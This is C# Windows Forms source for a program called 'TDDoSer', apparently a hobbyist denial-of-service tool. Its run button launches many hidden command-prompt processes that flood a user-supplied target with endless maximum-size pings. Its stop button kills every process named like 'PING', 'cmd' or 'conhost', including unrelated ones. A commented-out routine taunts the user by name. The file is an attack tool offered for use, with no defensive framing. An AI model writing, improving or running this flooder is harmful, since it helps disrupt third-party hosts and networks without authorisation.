using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TDDoSer
{
    public partial class Form1 : Form
    {
        private Process DoSPing;
        public Form1()
        {
            InitializeComponent();
            TextLabel.Text = Text;
           
        }

        private void runButton_Click(object sender, EventArgs e)
        {
            
            if (pingSwitch.Checked == true)
            {
                for (long i = pingThreads.Value; i > 0; i--)
                {
                    DoSPing = Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/c ping " + TargetTextBox.Text + " -t -l 65500",
                        WindowStyle = ProcessWindowStyle.Hidden,
                    });
                }




            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //SebyaDDoSAsync();
        }

         async void SebyaDDoSAsync()
         {
            
            await Task.Run(() =>
             {
                 notifyLabel1.Text = " - Слышь";
                 Thread.Sleep(300);
                 notifyLabel1.Text = " - Как тебя там";
                 Thread.Sleep(300);
                 notifyLabel1.Text = " - А,";
                 Thread.Sleep(300);
                 notifyLabel1.Text = " - Точно";
                 Thread.Sleep(300);
                 notifyLabel1.Text = " - "+Environment.UserName;
                 Thread.Sleep(300);
                 notifyLabel1.Text = " - Себя ДДоСь";
                 Thread.Sleep(300);

             });

          
         }

        private void stopButton_Click(object sender, EventArgs e)
        {
            //DoSPing.Close();
            while (pingThreads.Value > 0)
            {
                try
                {
                    List<string> name = new List<string> {"PING", "cmd", "conhost"}; //процесс, который нужно убить
                    Process[] etc = Process.GetProcesses(); //получим процессы
                    foreach (Process anti in etc) //обойдем каждый процесс
                    {

                        foreach (string s in name)
                        {
                            if (anti.ProcessName.ToLower().Contains(s.ToLower())) //найдем нужный и убьем
                            {
                                anti.Kill();
                                name.Remove(s);
                                
                            }
                        }
                    }
                    pingThreads.Value--;
                }
                catch
                {

                }
            }

           
        }
    }
}
